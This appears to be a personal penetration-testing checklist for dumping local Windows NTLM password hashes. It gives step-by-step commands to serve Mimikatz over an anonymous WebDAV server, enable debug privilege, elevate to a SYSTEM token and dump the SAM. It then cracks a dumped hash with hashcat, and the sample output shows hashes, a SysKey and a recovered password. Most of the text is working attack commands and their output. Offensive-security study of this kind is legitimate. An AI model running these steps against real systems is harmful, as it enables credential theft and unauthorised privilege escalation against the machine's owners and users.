# NTLM

Powershell - Retrieve hashes in the SAM that are stored as NTLM hashes

- [ ] Enumerate Users
    `Get-LocalUser`
    
- [ ] Transfer Mimikatz.exe and execute
    \- An option 
                    ~/.local/bin/wsgidav --host=0.0.0.0 --port=80 --root=./srvdir --auth=anonymous --root ./srvdir & (if wsgidav is installed, pip install wsgidav)
                     map, use the network share, or just wget download it....also can use python http server...ftp...ect....
    
- [ ] Check Privileges
    

```
mimikatz # privilege::debug
Privilege '20' OK
```

- [ ] Get Elevated Token

```
mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

656     {0;000003e7} 1 D 34811          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;000413a0} 1 F 6146616     windows.domain\username123    S-1-5-21-4264639230-2296035194-3358247000-1001  (14g,24p)       Primary
 * Thread Token  : {0;000003e7} 1 D 6217216     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)
```

- [ ] Dump SAM

```
mimikatz # lsadump::sam
Domain : windows.domain
SysKey : 2a0e15573f9ce6cdd6a1c62d222035d5
Local SID : S-1-5-21-4264639230-2296035194-3358247000
 
RID  : 000003e9 (1001)
User : username123
  Hash NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e
 
RID  : 000003ea (1002)
User : nelly
  Hash NTLM: 3ae8e5f0ffabb3a627672e1600f1ba10
```

- [ ] Copy the NTLM hash and crack it with hashcat

```
kali@kali:~/passwordattacks$ cat nelly.hash     
3ae8e5f0ffabb3a627672e1600f1ba10

hashcat -m 1000 nelly.hash 

....
3ae8e5f0ffabb3a627672e1600f1ba10:nicole1
....
```